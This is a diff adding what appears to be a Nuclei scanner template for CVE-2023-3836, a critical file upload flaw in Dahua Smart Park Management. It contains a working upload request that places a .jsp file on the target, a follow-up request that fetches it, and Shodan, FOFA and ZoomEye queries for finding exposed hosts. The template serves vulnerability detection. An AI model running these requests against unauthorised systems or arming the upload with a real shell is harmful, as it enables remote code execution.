@@ -1,0 +1,74 @@
+id: CVE-2023-3836
+
+info:
+  name: Dahua Smart Park Management - Arbitrary File Upload
+  author: HuTa0
+  severity: critical
+  description: |
+    Dahua wisdom park integrated management platform is a comprehensive management platform, a park operations,resource allocation, and intelligence services,and other functions, including/emap/devicePoint_addImgIco?.
+  remediation: |
+    Apply the latest security patch or update provided by the vendor to fix the arbitrary file upload vulnerability.
+  reference:
+    - https://github.com/qiuhuihk/cve/blob/main/upload.md
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-3836
+    - https://vuldb.com/?ctiid.235162
+    - https://vuldb.com/?id.235162
+    - https://github.com/1f3lse/taiE
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2023-3836
+    cwe-id: CWE-434
+    epss-score: 0.02637
+    epss-percentile: 0.90348
+    cpe: cpe:2.3:a:dahuasecurity:smart_parking_management:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: dahuasecurity
+    product: smart_parking_management
+    shodan-query:
+      - html:"/WPMS/asset"
+      - http.html:"/wpms/asset"
+    fofa-query: body="/wpms/asset"
+    zoomeye-query:
+      - /WPMS/asset
+      - /wpms/asset
+  tags: cve2023,cve,dahua,fileupload,intrusive,rce,dahuasecurity
+variables:
+  random_str: "{{rand_base(6)}}"
+  match_str: "{{md5(random_str)}}"
+
+http:
+  - raw:
+      - |
+        POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
+        Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
+        Host: {{Hostname}}
+
+        --A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
+        Content-Disposition: form-data; name="upload"; filename="{{random_str}}.jsp"
+        Content-Type: application/octet-stream
+        Content-Transfer-Encoding: binary
+
+        {{match_str}}
+        --A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
+      - |
+        GET /upload/emap/society_new/{{shell_filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, '{{match_str}}')"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: shell_filename
+        internal: true
+        part: body_1
+        regex:
+          - 'ico_res_(\w+)_on\.jsp'
+# digest: 490a004630440220606c5846c5be25299de2a61ac01659ecdc2fc59f93bb1fcbb37539019ae3f2a402201b12673926f6779f78f43767a9477ebc411e61312751f4bc04a088b79a22e6d7:922c64590222798bb761d5b6d8e72950
